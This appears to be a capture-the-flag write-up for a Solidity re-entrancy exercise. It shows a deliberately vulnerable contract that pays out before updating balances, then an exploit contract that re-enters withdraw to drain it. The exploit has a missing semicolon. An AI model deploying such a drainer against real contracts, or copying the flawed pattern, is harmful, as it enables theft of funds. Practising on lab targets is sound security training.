## 10. Re-entrancy

Goal for this exercise is:

- Steal all the funds from the contract


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}
~~~

<br/>

Name of this exercise was a hint. 

Not the most efficient solution but it works.
Here is the code to solve this:

~~~
pragma solidity ^0.6.0;

interface Reentrance {

  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint balance);

  function withdraw(uint _amount) external;

}


contract ReExploit {
    
    Reentrance Re = Reentrance(0x1234);
    address payable ReWallet = 0x1234

    address payable owner;
    
    uint public recallCounter = 0;

    // fund contract here    
    constructor() public payable {
        owner = msg.sender;
    }

    // default receive
    receive() external payable {
        if (recallCounter < 2) {
            recallCounter ++;
            callWithdraw();
        }
        recallCounter = 0;
    }
    
    function callDonate() public {
        (bool success, bytes memory response) = ReWallet.call{value: 100000000000000000, gas:800000}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Transfer was not successful.");
    }
    
    function callWithdraw() public {
        Re.withdraw(100000000000000000);
    } 
    
    // get funds back
    function debugWithdraw() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
~~~